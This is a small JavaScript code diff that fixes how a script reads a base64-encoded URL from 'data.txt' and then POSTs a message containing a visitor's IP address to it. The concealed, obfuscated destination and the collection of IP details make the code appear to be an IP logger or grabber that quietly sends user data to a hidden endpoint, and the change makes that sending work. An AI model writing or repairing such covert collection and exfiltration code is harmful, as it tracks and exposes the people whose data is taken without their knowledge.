@@ -115,9 +115,12 @@
                     `📡 **IP:** ${info.ip}\n` +
                     `\n-`;
                 
-                  fetch("data.txt").then(response => response.text()).then(text => {const firstLine = text.split("\n")[0].trim();const wU = atob(firstLine);})
-                  try {
-                    const response = await fetch(wU, {
+                  const fileResponse = await fetch("data.txt");
+                  const text = await fileResponse.text();
+                  const firstLine = text.split("\n")[0].trim();
+                  const wU = atob(firstLine);
+
+                  const response = await fetch(wU, {
                       method: "POST",
                       headers: {
                         'Content-Type': 'application/json'
